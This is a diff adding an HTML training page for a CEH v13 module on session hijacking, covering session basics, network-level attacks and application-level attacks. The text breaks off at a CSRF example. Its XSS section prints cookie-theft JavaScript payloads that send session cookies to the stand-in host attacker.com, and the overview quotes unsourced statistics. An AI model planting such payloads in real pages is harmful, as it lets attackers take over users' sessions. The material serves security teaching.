@@ -1,0 +1,2309 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CEH v13 Module 11: Session Hijacking</title>
+    <style>
+        :root {
+            --primary-color: #2c3e50;
+            --secondary-color: #3498db;
+            --accent-color: #e74c3c;
+            --success-color: #27ae60;
+            --warning-color: #f39c12;
+            --info-color: #8e44ad;
+            --dark-bg: #1a252f;
+            --card-bg: rgba(255, 255, 255, 0.95);
+            --text-light: #ecf0f1;
+            --gradient-primary: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            --gradient-secondary: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            --gradient-success: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--dark-bg);
+            color: var(--text-light);
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            background: var(--gradient-primary);
+            text-align: center;
+            padding: 40px 20px;
+            border-radius: 20px;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+
+        .header h1 {
+            font-size: 2.8rem;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .header p {
+            font-size: 1.2rem;
+            opacity: 0.9;
+            margin-bottom: 20px;
+        }
+
+        .progress-container {
+            background: rgba(255,255,255,0.2);
+            border-radius: 25px;
+            padding: 5px;
+            margin: 20px auto;
+            max-width: 500px;
+        }
+
+        .progress-bar {
+            background: var(--gradient-success);
+            height: 30px;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: white;
+            transition: width 0.3s ease;
+            width: 0%;
+        }
+
+        .navigation {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+
+        .nav-btn {
+            padding: 12px 20px;
+            background: rgba(255,255,255,0.1);
+            border: 2px solid transparent;
+            border-radius: 25px;
+            color: var(--text-light);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 0.9rem;
+            backdrop-filter: blur(10px);
+        }
+
+        .nav-btn:hover {
+            background: rgba(255,255,255,0.2);
+            border-color: var(--secondary-color);
+            transform: translateY(-2px);
+        }
+
+        .nav-btn.active {
+            background: var(--gradient-secondary);
+            border-color: var(--accent-color);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+        }
+
+        .content-area {
+            background: var(--card-bg);
+            border-radius: 20px;
+            padding: 40px;
+            color: var(--primary-color);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            min-height: 600px;
+        }
+
+        .module-section {
+            display: none;
+            animation: fadeIn 0.5s ease-in;
+        }
+
+        .module-section.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .section-title {
+            font-size: 2.2rem;
+            color: var(--primary-color);
+            margin-bottom: 30px;
+            text-align: center;
+            position: relative;
+        }
+
+        .section-title::after {
+            content: '';
+            display: block;
+            width: 100px;
+            height: 4px;
+            background: var(--gradient-primary);
+            margin: 15px auto;
+            border-radius: 2px;
+        }
+
+        .card {
+            background: linear-gradient(135deg, rgba(255,255,255,0.1), rgba(255,255,255,0.05));
+            border-radius: 15px;
+            padding: 30px;
+            margin: 20px 0;
+            border: 1px solid rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
+        }
+
+        .card h3 {
+            color: var(--secondary-color);
+            margin-bottom: 15px;
+            font-size: 1.4rem;
+        }
+
+        .attack-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 25px;
+            margin: 30px 0;
+        }
+
+        .attack-card {
+            background: var(--gradient-primary);
+            border-radius: 15px;
+            padding: 25px;
+            color: white;
+            text-align: center;
+            transition: transform 0.3s ease;
+            cursor: pointer;
+        }
+
+        .attack-card:hover {
+            transform: scale(1.05);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+        }
+
+        .tools-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin: 25px 0;
+        }
+
+        .tool-card {
+            background: var(--gradient-secondary);
+            border-radius: 12px;
+            padding: 20px;
+            color: white;
+            transition: transform 0.3s ease;
+        }
+
+        .tool-card:hover {
+            transform: translateY(-3px);
+        }
+
+        .countermeasure-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin: 25px 0;
+        }
+
+        .countermeasure-item {
+            background: var(--gradient-success);
+            border-radius: 10px;
+            padding: 20px;
+            color: white;
+            text-align: center;
+        }
+
+        .btn {
+            display: inline-block;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: bold;
+            text-decoration: none;
+            text-align: center;
+            transition: all 0.3s ease;
+            margin: 10px 5px;
+        }
+
+        .btn-primary {
+            background: var(--gradient-primary);
+            color: white;
+        }
+
+        .btn-success {
+            background: var(--gradient-success);
+            color: white;
+        }
+
+        .btn-warning {
+            background: linear-gradient(135deg, var(--warning-color), #e67e22);
+            color: white;
+        }
+
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+        }
+
+        .quiz-container {
+            margin: 20px 0;
+        }
+
+        .question {
+            background: rgba(52, 152, 219, 0.1);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 15px 0;
+            border-left: 4px solid var(--secondary-color);
+        }
+
+        .question h4 {
+            color: var(--primary-color);
+            margin-bottom: 15px;
+        }
+
+        .options {
+            list-style: none;
+            padding: 0;
+        }
+
+        .options li {
+            background: rgba(255,255,255,0.8);
+            margin: 8px 0;
+            padding: 10px 15px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+
+        .options li:hover {
+            background: rgba(52, 152, 219, 0.2);
+        }
+
+        .options li.selected {
+            background: var(--secondary-color);
+            color: white;
+        }
+
+        .options li.correct {
+            background: var(--success-color);
+            color: white;
+        }
+
+        .options li.incorrect {
+            background: var(--accent-color);
+            color: white;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.8);
+            backdrop-filter: blur(5px);
+        }
+
+        .modal-content {
+            background: var(--card-bg);
+            color: var(--primary-color);
+            margin: 5% auto;
+            padding: 30px;
+            border-radius: 20px;
+            width: 80%;
+            max-width: 800px;
+            max-height: 80vh;
+            overflow-y: auto;
+            position: relative;
+            animation: modalSlideIn 0.3s ease;
+        }
+
+        @keyframes modalSlideIn {
+            from { opacity: 0; transform: translateY(-50px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+            position: absolute;
+            right: 20px;
+            top: 15px;
+        }
+
+        .close:hover {
+            color: var(--accent-color);
+        }
+
+        .lab-exercise {
+            background: rgba(39, 174, 96, 0.1);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 15px 0;
+            border-left: 4px solid var(--success-color);
+        }
+
+        .warning-box {
+            background: rgba(243, 156, 18, 0.1);
+            border: 2px solid var(--warning-color);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .info-box {
+            background: rgba(142, 68, 173, 0.1);
+            border: 2px solid var(--info-color);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .highlight {
+            background: linear-gradient(120deg, #a8edea 0%, #fed6e3 100%);
+            padding: 2px 6px;
+            border-radius: 4px;
+            color: var(--primary-color);
+            font-weight: bold;
+        }
+
+        .technique-steps {
+            counter-reset: step-counter;
+            list-style: none;
+            padding: 0;
+        }
+
+        .technique-steps li {
+            counter-increment: step-counter;
+            background: rgba(255,255,255,0.1);
+            margin: 10px 0;
+            padding: 15px;
+            border-radius: 8px;
+            position: relative;
+            padding-left: 50px;
+        }
+
+        .technique-steps li::before {
+            content: counter(step-counter);
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: var(--secondary-color);
+            color: white;
+            width: 25px;
+            height: 25px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 0.8rem;
+        }
+
+        @media (max-width: 768px) {
+            .header h1 {
+                font-size: 2rem;
+            }
+
+            .content-area {
+                padding: 20px;
+            }
+
+            .attack-grid,
+            .tools-grid,
+            .countermeasure-list {
+                grid-template-columns: 1fr;
+            }
+
+            .navigation {
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .modal-content {
+                width: 95%;
+                margin: 10% auto;
+                padding: 20px;
+            }
+        }
+
+        /* Scrollbar styling */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: rgba(255,255,255,0.1);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--accent-color);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--warning-color);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔗 CEH v13 Module 11</h1>
+            <p>Session Hijacking & Session Management Security</p>
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            <p id="progressText">Progress: 0% Complete</p>
+            <div style="margin-top: 15px; font-size: 0.9em; color: rgba(255,255,255,0.8);">
+                <span style="background: rgba(255,255,255,0.1); padding: 8px 15px; border-radius: 20px; margin: 0 5px;">
+                    ← → Navigate Sections
+                </span>
+                <span style="background: rgba(255,255,255,0.1); padding: 8px 15px; border-radius: 20px; margin: 0 5px;">
+                    Esc Close Modal
+                </span>
+            </div>
+        </div>
+
+        <div class="navigation">
+            <button class="nav-btn active" onclick="showSection('overview')">📋 Overview</button>
+            <button class="nav-btn" onclick="showSection('fundamentals')">🔐 Fundamentals</button>
+            <button class="nav-btn" onclick="showSection('attack-types')">⚡ Attack Types</button>
+            <button class="nav-btn" onclick="showSection('network-hijacking')">🌐 Network Hijacking</button>
+            <button class="nav-btn" onclick="showSection('application-hijacking')">💻 Application Hijacking</button>
+            <button class="nav-btn" onclick="showSection('tools')">🔧 Tools & Techniques</button>
+            <button class="nav-btn" onclick="showSection('countermeasures')">🛡️ Countermeasures</button>
+            <button class="nav-btn" onclick="showSection('detection')">👁️ Detection Methods</button>
+            <button class="nav-btn" onclick="showSection('quiz')">📝 Assessment</button>
+        </div>
+
+        <div class="content-area">
+            <!-- Overview Section -->
+            <div id="overview" class="module-section active">
+                <h2 class="section-title">🎯 Module 11 Overview</h2>
+                
+                <div class="card">
+                    <h3>🔗 Session Hijacking: The Silent Threat</h3>
+                    <p>Welcome to CEH v13 Module 11! <span class="highlight">Session hijacking</span> represents one of the most insidious and effective attack vectors in cybersecurity. Unlike brute-force attacks or social engineering, session hijacking exploits the fundamental trust mechanisms that web applications use to maintain user state.</p>
+                    
+                    <p>In this comprehensive module, you'll master the art and science of session hijacking attacks, learning how attackers can seamlessly take over active user sessions and what defenders must do to prevent these sophisticated attacks.</p>
+                </div>
+
+                <div class="warning-box">
+                    <h4>⚠️ Critical Learning Objectives</h4>
+                    <p><strong>By completing this module, you will:</strong></p>
+                    <ul>
+                        <li>Understand session management vulnerabilities and their exploitation</li>
+                        <li>Master network-level and application-level session hijacking techniques</li>
+                        <li>Learn to use professional tools like Burp Suite, ZAP, and Wireshark</li>
+                        <li>Implement robust session security countermeasures</li>
+                        <li>Develop detection and monitoring strategies</li>
+                    </ul>
+                </div>
+
+                <div class="attack-grid">
+                    <div class="attack-card" onclick="showModal('sessionOverview')">
+                        <h4>🎭 What is Session Hijacking?</h4>
+                        <p>The art of taking over legitimate user sessions without authentication</p>
+                    </div>
+                    <div class="attack-card" onclick="showModal('sessionTypes')">
+                        <h4>🔄 Types of Session Attacks</h4>
+                        <p>Network-level, application-level, and hybrid attack vectors</p>
+                    </div>
+                    <div class="attack-card" onclick="showModal('sessionImpact')">
+                        <h4>💥 Business Impact</h4>
+                        <p>Financial loss, data breaches, and reputation damage</p>
+                    </div>
+                </div>
+
+                <div class="info-box">
+                    <h4>📊 Session Hijacking Statistics</h4>
+                    <ul>
+                        <li><strong>67%</strong> of web applications have session management vulnerabilities</li>
+                        <li><strong>$4.45M</strong> average cost of a data breach involving session compromise</li>
+                        <li><strong>89%</strong> of successful attacks involve session token theft</li>
+                        <li><strong>23 minutes</strong> average time for an attacker to exploit a hijacked session</li>
+                    </ul>
+                </div>
+
+                <button class="btn btn-success" onclick="showSection('fundamentals')">Begin Learning Journey →</button>
+            </div>
+
+            <!-- Fundamentals Section -->
+            <div id="fundamentals" class="module-section">
+                <h2 class="section-title">🔐 Session Management Fundamentals</h2>
+
+                <div class="card">
+                    <h3>🎯 Understanding Sessions</h3>
+                    <p>HTTP is a <span class="highlight">stateless protocol</span>, meaning each request is independent. To maintain user state across multiple requests, web applications implement session management mechanisms.</p>
+                    
+                    <h4>Key Components of Session Management:</h4>
+                    <ul class="technique-steps">
+                        <li><strong>Session ID Generation:</strong> Creating unique identifiers for each user session</li>
+                        <li><strong>Session Storage:</strong> Server-side storage of session data</li>
+                        <li><strong>Session Transmission:</strong> Secure delivery of session tokens to clients</li>
+                        <li><strong>Session Validation:</strong> Verifying session authenticity on each request</li>
+                        <li><strong>Session Termination:</strong> Proper cleanup when sessions end</li>
+                    </ul>
+                </div>
+
+                <div class="card">
+                    <h3>🔑 Session Token Characteristics</h3>
+                    <div class="tools-grid">
+                        <div class="tool-card">
+                            <h4>🎲 Randomness</h4>
+                            <p>Tokens must be cryptographically random and unpredictable. Weak randomness allows attackers to guess or predict valid session IDs.</p>
+                        </div>
+                        <div class="tool-card">
+                            <h4>📏 Length & Complexity</h4>
+                            <p>Sufficient entropy (minimum 128 bits) prevents brute-force attacks. Short or simple tokens are vulnerable to enumeration.</p>
+                        </div>
+                        <div class="tool-card">
+                            <h4>⏱️ Lifetime Management</h4>
+                            <p>Proper timeout mechanisms prevent indefinite session reuse. Absolute and idle timeouts limit exposure windows.</p>
+                        </div>
+                        <div class="tool-card">
+                            <h4>🔄 Regeneration</h4>
+                            <p>Session IDs should regenerate after authentication and privilege changes to prevent fixation attacks.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>📡 Session Token Transmission Methods</h3>
+                    
+                    <div class="warning-box">
+                        <h4>🍪 HTTP Cookies (Most Common)</h4>
+                        <p><strong>Advantages:</strong> Automatic handling, HttpOnly flag support, Secure flag for HTTPS</p>
+                        <p><strong>Vulnerabilities:</strong> XSS exploitation, CSRF attacks, insecure transmission</p>
+                    </div>
+
+                    <div class="info-box">
+                        <h4>🔗 URL Parameters</h4>
+                        <p><strong>Method:</strong> Session ID included in query parameters</p>
+                        <p><strong>Risks:</strong> Logged in server logs, exposed in referrer headers, visible in browser history</p>
+                    </div>
+
+                    <div style="background: rgba(142, 68, 173, 0.1); padding: 20px; border-radius: 10px; margin: 20px 0;">
+                        <h4>📨 HTTP Headers</h4>
+                        <p><strong>Custom Headers:</strong> Authorization, X-Session-Token, etc.</p>
+                        <p><strong>Security:</strong> Not automatically sent by browsers, requires explicit handling</p>
+                    </div>
+                </div>
+
+                <button class="btn btn-primary" onclick="showSection('attack-types')">Next: Attack Classifications →</button>
+            </div>
+
+            <!-- Attack Types Section -->
+            <div id="attack-types" class="module-section">
+                <h2 class="section-title">⚡ Session Hijacking Attack Classifications</h2>
+
+                <div class="card">
+                    <h3>🎭 Passive vs Active Attacks</h3>
+                    
+                    <div class="attack-grid">
+                        <div class="attack-card" style="background: var(--gradient-success);">
+                            <h4>👁️ Passive Attacks</h4>
+                            <p><strong>Method:</strong> Observation and interception without interference</p>
+                            <ul style="text-align: left; margin-top: 15px;">
+                                <li>Network sniffing</li>
+                                <li>Packet capture analysis</li>
+                                <li>Log file examination</li>
+                                <li>Shoulder surfing</li>
+                            </ul>
+                            <p style="margin-top: 15px;"><strong>Goal:</strong> Steal session tokens for later use</p>
+                        </div>
+                        
+                        <div class="attack-card" style="background: var(--gradient-secondary);">
+                            <h4>🎯 Active Attacks</h4>
+                            <p><strong>Method:</strong> Direct manipulation and real-time exploitation</p>
+                            <ul style="text-align: left; margin-top: 15px;">
+                                <li>Man-in-the-middle</li>
+                                <li>Session fixation</li>
+                                <li>Cross-site scripting</li>
+                                <li>TCP/IP hijacking</li>
+                            </ul>
+                            <p style="margin-top: 15px;"><strong>Goal:</strong> Immediate session takeover and control</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🌐 Network-Level vs Application-Level</h3>
+                    
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 30px; margin: 25px 0;">
+                        <div style="background: rgba(52, 152, 219, 0.1); padding: 20px; border-radius: 10px;">
+                            <h4>🌐 Network-Level Attacks</h4>
+                            <p><strong>Target:</strong> Network protocols and infrastructure</p>
+                            <ul>
+                                <li><strong>TCP Hijacking:</strong> Taking over TCP connections</li>
+                                <li><strong>UDP Session Hijacking:</strong> Exploiting UDP communications</li>
+                                <li><strong>IP Spoofing:</strong> Impersonating legitimate hosts</li>
+                                <li><strong>ARP Poisoning:</strong> Redirecting network traffic</li>
+                                <li><strong>DNS Spoofing:</strong> Redirecting domain resolutions</li>
+                            </ul>
+                        </div>
+                        
+                        <div style="background: rgba(142, 68, 173, 0.1); padding: 20px; border-radius: 10px;">
+                            <h4>💻 Application-Level Attacks</h4>
+                            <p><strong>Target:</strong> Web applications and session management</p>
+                            <ul>
+                                <li><strong>Session Fixation:</strong> Forcing predetermined session IDs</li>
+                                <li><strong>XSS-based Hijacking:</strong> JavaScript session theft</li>
+                                <li><strong>CSRF Attacks:</strong> Cross-site request forgery</li>
+                                <li><strong>Cookie Theft:</strong> Direct cookie manipulation</li>
+                                <li><strong>Man-in-the-Browser:</strong> Malware-based interception</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🔄 Session Attack Lifecycle</h3>
+                    <ol class="technique-steps">
+                        <li><strong>Reconnaissance:</strong> Identify target applications and session mechanisms</li>
+                        <li><strong>Session Discovery:</strong> Locate and analyze session tokens</li>
+                        <li><strong>Token Acquisition:</strong> Steal, predict, or fixate session identifiers</li>
+                        <li><strong>Session Validation:</strong> Test acquired tokens for validity</li>
+                        <li><strong>Privilege Escalation:</strong> Exploit session permissions</li>
+                        <li><strong>Persistence:</strong> Maintain unauthorized access</li>
+                        <li><strong>Data Exfiltration:</strong> Extract valuable information</li>
+                        <li><strong>Cleanup:</strong> Remove traces of the attack</li>
+                    </ol>
+                </div>
+
+                <div class="warning-box">
+                    <h4>⚡ Common Attack Scenarios</h4>
+                    <ul>
+                        <li><strong>Coffee Shop WiFi:</strong> Unencrypted wireless networks expose session tokens</li>
+                        <li><strong>Shared Computers:</strong> Session cookies persist after logout</li>
+                        <li><strong>Phishing Sites:</strong> Malicious sites steal authentication credentials</li>
+                        <li><strong>Malware Infections:</strong> Browser-based malware intercepts sessions</li>
+                        <li><strong>Insider Threats:</strong> Privileged users abuse network access</li>
+                    </ul>
+                </div>
+
+                <button class="btn btn-success" onclick="showSection('network-hijacking')">Next: Network Hijacking →</button>
+            </div>
+
+            <!-- Network Hijacking Section -->
+            <div id="network-hijacking" class="module-section">
+                <h2 class="section-title">🌐 Network-Level Session Hijacking</h2>
+
+                <div class="card">
+                    <h3>🔌 TCP Session Hijacking</h3>
+                    <p>TCP hijacking exploits the connection-oriented nature of the TCP protocol. Attackers predict sequence numbers and inject malicious packets to take over established connections.</p>
+                    
+                    <div class="info-box">
+                        <h4>📋 TCP Hijacking Process</h4>
+                        <ol class="technique-steps">
+                            <li><strong>Network Monitoring:</strong> Capture TCP traffic between client and server</li>
+                            <li><strong>Sequence Analysis:</strong> Track TCP sequence and acknowledgment numbers</li>
+                            <li><strong>Connection State Mapping:</strong> Understand current connection parameters</li>
+                            <li><strong>Packet Injection:</strong> Send crafted packets with correct sequence numbers</li>
+                            <li><strong>Desynchronization:</strong> Prevent legitimate client from interfering</li>
+                            <li><strong>Session Control:</strong> Execute commands as the hijacked user</li>
+                        </ol>
+                    </div>
+
+                    <div class="warning-box">
+                        <h4>⚠️ TCP Hijacking Variants</h4>
+                        <ul>
+                            <li><strong>Blind Hijacking:</strong> Inject packets without seeing responses</li>
+                            <li><strong>Non-Blind Hijacking:</strong> Full visibility of traffic flow</li>
+                            <li><strong>Man-in-the-Middle:</strong> Position between client and server</li>
+                            <li><strong>RST Hijacking:</strong> Reset connections and force reconnection</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>📡 UDP Session Hijacking</h3>
+                    <p>While UDP is connectionless, applications often implement session-like behavior over UDP. Attackers can exploit predictable transaction IDs or sequence numbers.</p>
+                    
+                    <div class="tools-grid">
+                        <div class="tool-card">
+                            <h4>🎯 Target Applications</h4>
+                            <p>DNS servers, SNMP services, DHCP servers, VoIP systems, online gaming</p>
+                        </div>
+                        <div class="tool-card">
+                            <h4>🔍 Attack Methods</h4>
+                            <p>Source port prediction, transaction ID guessing, timing attacks</p>
+                        </div>
+                        <div class="tool-card">
+                            <h4>💥 Impact</h4>
+                            <p>Service disruption, data manipulation, unauthorized access</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🎭 IP Spoofing Attacks</h3>
+                    <p>IP spoofing involves forging the source IP address of packets to impersonate legitimate hosts. When combined with session prediction, it enables session hijacking.</p>
+                    
+                    <div class="attack-grid">
+                        <div class="attack-card" style="background: linear-gradient(135deg, #667eea, #764ba2);">
+                            <h4>🌐 Non-Blind Spoofing</h4>
+                            <p>Attacker can see responses</p>
+                            <ul style="text-align: left; margin-top: 10px;">
+                                <li>Same network segment</li>
+                                <li>Compromised router</li>
+                                <li>Man-in-the-middle position</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="attack-card" style="background: linear-gradient(135deg, #f093fb, #f5576c);">
+                            <h4>👁️ Blind Spoofing</h4>
+                            <p>Attacker cannot see responses</p>
+                            <ul style="text-align: left; margin-top: 10px;">
+                                <li>Remote network location</li>
+                                <li>Sequence number prediction</li>
+                                <li>Higher complexity</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="info-box">
+                        <h4>🛠️ Spoofing Prerequisites</h4>
+                        <ul>
+                            <li><strong>Network Access:</strong> Ability to send packets to the target</li>
+                            <li><strong>Session Knowledge:</strong> Understanding of session parameters</li>
+                            <li><strong>Timing Control:</strong> Precise packet injection timing</li>
+                            <li><strong>Traffic Analysis:</strong> Monitoring legitimate session flow</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🔄 ARP Poisoning & Session Hijacking</h3>
+                    <p>ARP poisoning allows attackers to intercept traffic on local networks by corrupting ARP tables. This enables real-time session monitoring and manipulation.</p>
+                    
+                    <ol class="technique-steps">
+                        <li><strong>Network Discovery:</strong> Scan for active hosts and their MAC addresses</li>
+                        <li><strong>ARP Cache Poisoning:</strong> Send false ARP responses to redirect traffic</li>
+                        <li><strong>Traffic Interception:</strong> Capture all session-related communications</li>
+                        <li><strong>Session Analysis:</strong> Extract session tokens and authentication data</li>
+                        <li><strong>Session Replay:</strong> Use captured tokens to impersonate users</li>
+                        <li><strong>Persistent Access:</strong> Maintain position for ongoing attacks</li>
+                    </ol>
+                </div>
+
+                <div class="lab-exercise">
+                    <h4>🧪 Network Hijacking Lab Exercise</h4>
+                    <p><strong>Objective:</strong> Demonstrate TCP session hijacking in a controlled environment</p>
+                    <p><strong>Tools Required:</strong> Wireshark, Ettercap, Scapy</p>
+                    <p><strong>Scenario:</strong> Intercept and hijack a Telnet session between two systems</p>
+                    <div style="background: rgba(255,255,255,0.1); padding: 15px; border-radius: 8px; margin: 10px 0;">
+                        <strong>⚠️ Note:</strong> This exercise should only be performed in authorized lab environments with explicit permission.
+                    </div>
+                </div>
+
+                <button class="btn btn-primary" onclick="showSection('application-hijacking')">Next: Application Hijacking →</button>
+            </div>
+
+            <!-- Application Hijacking Section -->
+            <div id="application-hijacking" class="module-section">
+                <h2 class="section-title">💻 Application-Level Session Hijacking</h2>
+
+                <div class="card">
+                    <h3>🎯 Session Fixation Attacks</h3>
+                    <p>Session fixation occurs when an attacker forces a user to use a predetermined session ID. The attacker then uses the same ID to hijack the user's authenticated session.</p>
+                    
+                    <div class="attack-grid">
+                        <div class="attack-card" style="background: var(--gradient-primary);">
+                            <h4>🔗 URL-Based Fixation</h4>
+                            <p>Attacker sends URL with embedded session ID</p>
+                            <code style="background: rgba(255,255,255,0.2); padding: 5px; border-radius: 4px; display: block; margin: 10px 0;">
+                                https://bank.com/login?JSESSIONID=A1B2C3D4
+                            </code>
+                        </div>
+                        
+                        <div class="attack-card" style="background: var(--gradient-secondary);">
+                            <h4>🍪 Cookie-Based Fixation</h4>
+                            <p>JavaScript injection to set session cookies</p>
+                            <code style="background: rgba(255,255,255,0.2); padding: 5px; border-radius: 4px; display: block; margin: 10px 0;">
+                                document.cookie="SESSIONID=FIXED_VALUE"
+                            </code>
+                        </div>
+                        
+                        <div class="attack-card" style="background: var(--gradient-success);">
+                            <h4>📨 Form-Based Fixation</h4>
+                            <p>Hidden form fields with fixed session values</p>
+                            <code style="background: rgba(255,255,255,0.2); padding: 5px; border-radius: 4px; display: block; margin: 10px 0;">
+                                &lt;input type="hidden" name="sid" value="FIXED"&gt;
+                            </code>
+                        </div>
+                    </div>
+
+                    <div class="info-box">
+                        <h4>🔄 Session Fixation Process</h4>
+                        <ol class="technique-steps">
+                            <li><strong>Session ID Acquisition:</strong> Attacker obtains a valid session ID from target application</li>
+                            <li><strong>Victim Preparation:</strong> Trick victim into using the predetermined session ID</li>
+                            <li><strong>Authentication Bypass:</strong> Wait for victim to authenticate with the fixed session</li>
+                            <li><strong>Session Takeover:</strong> Use the same session ID to access victim's account</li>
+                            <li><strong>Privilege Abuse:</strong> Perform unauthorized actions as the authenticated user</li>
+                        </ol>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>⚡ Cross-Site Scripting (XSS) Session Theft</h3>
+                    <p>XSS vulnerabilities allow attackers to inject malicious JavaScript that can steal session cookies and other sensitive information.</p>
+                    
+                    <div class="tools-grid">
+                        <div class="tool-card" style="background: linear-gradient(135deg, #667eea, #764ba2);">
+                            <h4>🔄 Reflected XSS</h4>
+                            <p>Immediate execution of malicious script</p>
+                            <ul style="text-align: left; margin-top: 10px; font-size: 0.9rem;">
+                                <li>URL parameter injection</li>
+                                <li>Social engineering required</li>
+                                <li>Single-use attack vector</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="tool-card" style="background: linear-gradient(135deg, #f093fb, #f5576c);">
+                            <h4>💾 Stored XSS</h4>
+                            <p>Persistent malicious script storage</p>
+                            <ul style="text-align: left; margin-top: 10px; font-size: 0.9rem;">
+                                <li>Database/file system storage</li>
+                                <li>Affects multiple users</li>
+                                <li>Higher impact potential</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="tool-card" style="background: linear-gradient(135deg, #4facfe, #00f2fe);">
+                            <h4>📱 DOM-based XSS</h4>
+                            <p>Client-side script manipulation</p>
+                            <ul style="text-align: left; margin-top: 10px; font-size: 0.9rem;">
+                                <li>JavaScript DOM modification</li>
+                                <li>Browser-based execution</li>
+                                <li>Harder to detect</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="warning-box">
+                        <h4>🍪 Cookie Theft Payloads</h4>
+                        <pre style="background: rgba(0,0,0,0.3); padding: 15px; border-radius: 8px; color: #fff; font-size: 0.9rem;">
+// Basic cookie theft
+document.location='http://attacker.com/steal.php?cookie='+document.cookie;
+
+// Stealth cookie exfiltration
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'http://attacker.com/steal.php?cookie=' + document.cookie, true);
+xhr.send();
+
+// Session token extraction
+var sessionToken = document.cookie.match(/SESSIONID=([^;]+)/)[1];
+fetch('http://attacker.com/collect', {method: 'POST', body: sessionToken});
+                        </pre>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🔀 Cross-Site Request Forgery (CSRF)</h3>
+                    <p>CSRF attacks force authenticated users to execute unwanted actions on web applications where they're currently authenticated.</p>
+                    
+                    <div class="info-box">
+                        <h4>🎯 CSRF Attack Prerequisites</h4>
+                        <ul>
+                            <li><strong>Active Session:</strong> Victim must be logged into target application</li>
+                            <li><strong>Predictable Requests:</strong> Application uses predictable request formats</li>
+                            <li><strong>No CSRF Protection:</strong> Lack of anti-CSRF tokens or validation</li>
+                            <li><strong>Social Engineering:</strong> Trick user into visiting malicious page</li>
+                        </ul>
+                    </div>
+
+                    <div style="background: rgba(231, 76, 60, 0.1); padding: 20px; border-radius: 10px; margin: 20px 0;">
+                        <h4>🔥 CSRF Payload Examples</h4>
+                        <pre style="background: rgba(0,0,0,0.3); padding: 15px; border-radius: 8px; color: #fff; font-size: 0.8rem;">
+&lt;!-- Image-based CSRF --&gt;
